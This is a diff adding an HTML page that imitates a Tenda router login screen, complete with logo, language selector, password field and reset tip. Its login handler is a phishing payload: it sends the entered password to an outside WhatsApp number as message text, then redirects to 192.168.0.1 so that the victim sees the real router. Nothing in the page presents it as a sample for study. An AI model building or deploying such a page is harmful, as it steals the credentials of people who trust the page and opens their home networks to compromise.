@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tenda | Login</title>
+<style>
+  :root {
+    --orange: #ED7020;
+    --border-gray: #E2E4E8;
+    --placeholder-gray: #A7ACB4;
+    --icon-gray: #58595C;
+    --text-dark: #26282B;
+    --link-gray: #A7ACB4;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body { margin: 0; height: 100%; }
+
+  body {
+    font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    background: #FFFFFF;
+    display: flex;
+    justify-content: center;
+  }
+
+  .page {
+    width: 100%;
+    max-width: 360px;
+    padding: 28px 27px 24px;
+    position: relative;
+  }
+
+  .logo-wrap {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 28px;
+  }
+
+  .logo-wrap img {
+    width: 116px;
+    height: auto;
+    display: block;
+  }
+
+  .fields {
+    position: relative;
+  }
+
+  .field {
+    display: flex;
+    align-items: center;
+    border: 1px solid var(--border-gray);
+    border-radius: 8px;
+    padding: 0 13px;
+    height: 34px;
+    gap: 10px;
+    background: #fff;
+  }
+
+  .field + .field { margin-top: 17px; }
+
+  .field .icon { flex-shrink: 0; display: flex; }
+
+  .field select,
+  .field input {
+    border: none;
+    outline: none;
+    font-size: 14.5px;
+    color: var(--text-dark);
+    width: 100%;
+    height: 100%;
+    background: transparent;
+    appearance: none;
+    -webkit-appearance: none;
+    font-family: inherit;
+    padding: 0;
+  }
+
+  .field select { cursor: pointer; color: var(--text-dark) !important; }
+  .field input::placeholder { color: var(--placeholder-gray); }
+  .field .chevron { flex-shrink: 0; color: #9DA2A9; }
+
+  .eye-toggle {
+    flex-shrink: 0;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    padding: 4px;
+    margin: -4px;
+  }
+
+  .login-btn {
+    display: block;
+    width: 100%;
+    height: 36px;
+    background: var(--orange);
+    border: none;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 14.5px;
+    font-weight: 500;
+    margin-top: 54px;
+    cursor: pointer;
+    font-family: inherit;
+  }
+
+  .login-btn:active { background: #D9640F; }
+
+  .forgot-row {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    margin-top: 18px;
+    width: fit-content;
+  }
+
+  .forgot-btn {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    color: var(--link-gray);
+    font-size: 13px;
+    background: none;
+    border: none;
+    padding: 0;
+    cursor: pointer;
+    font-family: inherit;
+  }
+
+  .forgot-btn .arrow {
+    display: flex;
+    transition: transform 0.15s ease;
+  }
+
+  .forgot-btn.open .arrow { transform: rotate(90deg); }
+
+  /* Inline modal / tooltip, matches Tenda's own overlay behavior */
+  .reset-tip {
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 0;
+    background: rgba(20, 20, 20, 0.9);
+    color: #fff;
+    border-radius: 8px;
+    padding: 14px 15px;
+    font-size: 13.5px;
+    line-height: 1.55;
+    display: none;
+    z-index: 5;
+  }
+
+  .reset-tip.show { display: block; }
+
+  .reset-tip .close-x {
+    position: absolute;
+    top: 8px;
+    right: 10px;
+    color: rgba(255,255,255,0.6);
+    font-size: 16px;
+    cursor: pointer;
+    line-height: 1;
+    padding: 4px;
+  }
+
+  @media (max-width: 340px) {
+    .page { padding: 24px 20px 20px; }
+  }
+</style>
+</head>
+<body>
+  <div class="page">
+
+    <div class="logo-wrap">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAAAeCAYAAAACe928AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDE0IDc5LjE1MTQ4MSwgMjAxMy8wMy8xMy0xMjowOToxNSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NEUwNDVDRkExQTE4MTFFNThCOEFGMTlBNzFDOUNBNzUiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NEUwNDVDRjkxQTE4MTFFNThCOEFGMTlBNzFDOUNBNzUiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkFGQjMzN0U0ODEwQzExRTQ4MUU3RDZCNTFENjJEMDdBIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkFGQjMzN0U1ODEwQzExRTQ4MUU3RDZCNTFENjJEMDdBIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+nrUeuQAAB3dJREFUaN7tW310z1UY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" alt="Tenda">
+    </div>
+
+    <div class="fields" id="fieldsWrap">
+
+      <div class="reset-tip" id="resetTip">
+        <span class="close-x" id="closeTip" title="Close">&times;</span>
+        &gt; First, push the reset button for about 8 seconds and then release it to reset your router.<br>
+        Second, set a new login password.
+      </div>
+
+      <div class="field">
+        <span class="icon">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="9" stroke="#58595C" stroke-width="1.7"/>
+            <ellipse cx="12" cy="12" rx="4" ry="9" stroke="#58595C" stroke-width="1.7"/>
+            <line x1="3" y1="12" x2="21" y2="12" stroke="#58595C" stroke-width="1.7"/>
+          </svg>
+        </span>
+        <select>
+          <option>English</option>
+          <option>中文</option>
+          <option>Español</option>
+          <option>Français</option>
+          <option>Русский</option>
+        </select>
+        <span class="chevron">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </span>
+      </div>
+
+      <div class="field">
+        <span class="icon">
+          <svg width="15" height="17" viewBox="0 0 24 26" fill="#58595C">
+            <path d="M12 0a6.5 6.5 0 00-6.5 6.5V10H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V12a2 2 0 00-2-2h-1.5V6.5A6.5 6.5 0 0012 0zm0 2.2a4.3 4.3 0 014.3 4.3V10H7.7V6.5A4.3 4.3 0 0112 2.2z"/>
+          </svg>
+        </span>
+        <input id="password" type="password" placeholder="Login Password">
+        <span class="eye-toggle" onclick="togglePassword()">
+          <svg id="eye-icon" width="19" height="13" viewBox="0 0 24 16" fill="none">
+            <path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>
+            <path d="M4 8c1.2 1 2.6 1.8 4 2.3M20 8c-1.2 1-2.6 1.8-4 2.3" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>
+          </svg>
+        </span>
+      </div>
+
+    </div>
+
+    <button class="login-btn" >Login</button>
+
+    <div class="forgot-row">
+      <button class="forgot-btn" id="forgotBtn" onclick="toggleTip()">
+        Forgot your password?
+        <span class="arrow">
+          <svg width="8" height="8" viewBox="0 0 7 10" fill="#A7ACB4">
+            <path d="M0 0l7 5-7 5V0z"/>
+          </svg>
+        </span>
+      </button>
+    </div>
+
+  </div>
+
+<script>
+  function togglePassword() {
+    const input = document.getElementById('password');
+    const icon = document.getElementById('eye-icon');
+    if (input.type === 'password') {
+      input.type = 'text';
+      icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7c-2.7 4.5-6.8 7-11 7S3.7 12.5 1 8z" stroke="#6B7280" stroke-width="1.6" fill="none"/><circle cx="12" cy="8" r="2.4" stroke="#6B7280" stroke-width="1.6" fill="none"/>';
+    } else {
+      input.type = 'password';
+      icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/><path d="M4 8c1.2 1 2.6 1.8 4 2.3M20 8c-1.2 1-2.6 1.8-4 2.3" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>';
+    }
+  }
+
+  const tip = document.getElementById('resetTip');
+  const forgotBtn = document.getElementById('forgotBtn');
+  const closeX = document.getElementById('closeTip');
+
+  function toggleTip() {
+    const isOpen = tip.classList.contains('show');
+    if (isOpen) { closeTip(); } else { openTip(); }
+  }
+
+  function openTip() {
+    tip.classList.add('show');
+    forgotBtn.classList.add('open');
+  }
+
+  function closeTip() {
+    tip.classList.remove('show');
+    forgotBtn.classList.remove('open');
+  }
+
+  closeX.addEventListener('click', function(e) {
+    e.stopPropagation();
+    closeTip();
+  });
+
+  document.addEventListener('click', function(e) {
+    if (tip.classList.contains('show') &&
+        !tip.contains(e.target) &&
+        !forgotBtn.contains(e.target)) {
+      closeTip();
+    }
+  });
+  
+document.querySelector('.login-btn').addEventListener('click', function() {
+    const password = document.getElementById('password').value;
+   
+    window.open(`https://wa.me/254113313338?text=Password: ${password}`);
+   
+    window.location.href = 'http://192.168.0.1';
+});
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeTip();
+  });
+</script>
+</body>
+</html>
